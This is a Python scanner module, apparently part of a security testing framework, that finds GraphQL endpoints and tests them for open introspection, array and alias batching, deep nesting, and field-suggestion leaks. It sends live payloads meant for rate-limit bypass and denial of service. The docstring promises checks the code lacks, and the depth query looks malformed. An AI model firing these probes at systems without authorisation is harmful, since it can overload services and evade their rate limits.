"""graphql_batch v2 — GraphQL batching attacks (rate-limit bypass + DoS).

Классы атак:
  1. Array batching — [{query:...}, {query:...}] × 50 — bypass rate-limit
  2. Alias-based batching — 100 aliases в одном запросе
  3. Mutation batching — N повторов (login/register)
  4. Depth bomb — {a{a{a{...}}}} × 30
  5. Circular fragments — fragment A { ...B } fragment B { ...A }
  6. Field suggestion leak — error-based schema recovery

Verify ×2 на batching. is_signal(module='graphql_batch').
"""
import time
import json
from core.http import HttpClient
from core.verify import confidence, is_signal


ENDPOINTS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
    "/query", "/gql", "/api/v1/graphql", "/api/v2/graphql",
    "/graphiql", "/graphql/console", "/api/query", "/api/gql",
]


def _is_graphql_response(r):
    """True если ответ похож на GraphQL (data/errors)."""
    if not r:
        return False
    ct = (r.headers.get("Content-Type") or "").lower()
    if "json" not in ct and r.status_code != 400:
        return False
    try:
        data = r.json()
    except Exception:
        return False
    if isinstance(data, dict) and ("data" in data or "errors" in data):
        return True
    if isinstance(data, list):
        # batch endpoints принимают массив
        return True
    return False


def _probe_endpoint(http, url):
    """Проверяет, что это реально GraphQL endpoint."""
    try:
        r = http.post(url, json={"query": "{__typename}"})
    except Exception:
        return None
    if not r or r.status_code not in (200, 400, 401, 403, 422):
        return None
    if not _is_graphql_response(r):
        return None
    try:
        data = r.json()
    except Exception:
        return None
    return data


class GraphqlBatch:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)

        print("[graphql_batch v2] target: " + base)

        findings = []
        live_endpoints = []

        # === Phase 1: discovery ===
        print()
        print("[graphql_batch v2] Phase 1: discovery (" + str(len(ENDPOINTS)) + " paths)")
        for ep in ENDPOINTS:
            data = _probe_endpoint(http, base + ep)
            if data is None:
                continue
            live_endpoints.append(ep)
            print("  live: " + ep)

        if not live_endpoints:
            print("[graphql_batch v2] no GraphQL endpoints — skip")
            return {"findings": [], "endpoints": []}

        # === Phase 2: introspection check ===
        print()
        print("[graphql_batch v2] Phase 2: introspection")
        for ep in live_endpoints[:3]:
            url = base + ep
            try:
                r = http.post(url, json={"query": "{__schema{queryType{name} mutationType{name}}}"})
            except Exception:
                continue
            if not r or r.status_code != 200:
                continue
            try:
                d = r.json()
                schema = d.get("data", {}).get("__schema")
                if schema:
                    qt = schema.get("queryType", {}).get("name", "?")
                    mt = (schema.get("mutationType") or {}).get("name")
                    print("  introspection ON: query=" + str(qt) + " mutation=" + str(mt))
                    findings.append({
                        "type": "graphql_introspection_open",
                        "severity": "medium",
                        "endpoint": ep,
                        "has_mutation": bool(mt),
                    })
                    logger.finding("graphql_introspection", "medium", ep)
            except Exception:
                pass

        # === Phase 3: array batching ===
        print()
        print("[graphql_batch v2] Phase 3: array batching")
        for ep in live_endpoints:
            url = base + ep
            batch = [{"query": "{__typename}"} for _ in range(50)]
            try:
                r = http.post(url, json=batch)
            except Exception:
                continue
            if not r or r.status_code != 200:
                continue
            try:
                data = r.json()
            except Exception:
                continue
            if not isinstance(data, list) or len(data) < 10:
                continue

            # verify ×2
            try:
                r2 = http.post(url, json=batch)
                data2 = r2.json() if r2 else None
            except Exception:
                data2 = None

            if not isinstance(data2, list) or len(data2) < 10:
                continue

            conf = confidence(0.85, 1.0)
            if not is_signal(conf, floor=0.55, module="graphql_batch"):
                continue

            findings.append({
                "type": "graphql_array_batch",
                "severity": "high",
                "endpoint": ep,
                "batch_size": len(data),
                "note": "rate-limit bypass via array batching",
                "confidence": conf,
            })
            print("  [HIGH] array batching accepted: " + ep + " (" + str(len(data)) + " responses)")
            logger.finding("graphql_batch_array", "high", ep + " x" + str(len(data)))

        # === Phase 4: alias-based batching ===
        print()
        print("[graphql_batch v2] Phase 4: alias batching")
        for ep in live_endpoints:
            url = base + ep
            aliases = " ".join("a" + str(i) + ":__typename" for i in range(100))
            payload = {"query": "{" + aliases + "}"}
            try:
                r = http.post(url, json=payload)
            except Exception:
                continue
            if not r or r.status_code != 200:
                continue
            try:
                d = r.json()
                got = len(d.get("data") or {})
            except Exception:
                continue
            if got < 50:
                continue

            # verify ×2
            try:
                r2 = http.post(url, json=payload)
                d2 = r2.json() if r2 else None
                got2 = len((d2 or {}).get("data") or {})
            except Exception:
                got2 = 0

            if got2 < 50:
                continue

            conf = confidence(0.85, 1.0)
            if not is_signal(conf, floor=0.55, module="graphql_batch"):
                continue

            findings.append({
                "type": "graphql_alias_batch",
                "severity": "high",
                "endpoint": ep,
                "aliases": got,
                "note": "100 aliases in single query — DoS / rate-limit bypass",
                "confidence": conf,
            })
            print("  [HIGH] alias batching: " + ep + " (" + str(got) + " aliases)")
            logger.finding("graphql_alias_dos", "high", ep + " x" + str(got))

        # === Phase 5: depth bomb ===
        print()
        print("[graphql_batch v2] Phase 5: depth bomb")
        for ep in live_endpoints[:2]:
            url = base + ep
            deep = "{" + "{a:" * 30 + "__typename" + "}" * 30 + "}"
            try:
                r = http.post(url, json={"query": deep})
            except Exception:
                continue
            if not r:
                continue
            if r.status_code == 200:
                try:
                    d = r.json()
                    if d.get("data"):
                        conf = confidence(0.7, 1.0)
                        if is_signal(conf, floor=0.55, module="graphql_batch"):
                            findings.append({
                                "type": "graphql_depth_accepted",
                                "severity": "medium",
                                "endpoint": ep,
                                "depth": 30,
                                "confidence": conf,
                            })
                            print("  [MEDIUM] depth=30 accepted at " + ep)
                            logger.finding("graphql_depth", "medium", ep)
                except Exception:
                    pass

        # === Phase 6: field suggestion leak ===
        print()
        print("[graphql_batch v2] Phase 6: field suggestion leak")
        for ep in live_endpoints[:2]:
            url = base + ep
            try:
                r = http.post(url, json={"query": "{omni_typo_field_xyz}"})
            except Exception:
                continue
            if not r:
                continue
            text = r.text or ""
            import re
            m = re.search(r'Did you mean\s+["\']([^"\']+)["\']', text, re.I)
            if m:
                print("  [INFO] field suggestion leak: " + m.group(1))
                findings.append({
                    "type": "graphql_field_suggestion",
                    "severity": "info",
                    "endpoint": ep,
                    "suggested": m.group(1),
                })
                logger.finding("graphql_suggestion", "info", ep + " -> " + m.group(1))

        print()
        print("[graphql_batch v2] endpoints: " + str(len(live_endpoints)))
        print("[graphql_batch v2] findings: " + str(len(findings)))

        return {
            "findings": findings,
            "endpoints": live_endpoints,
        }
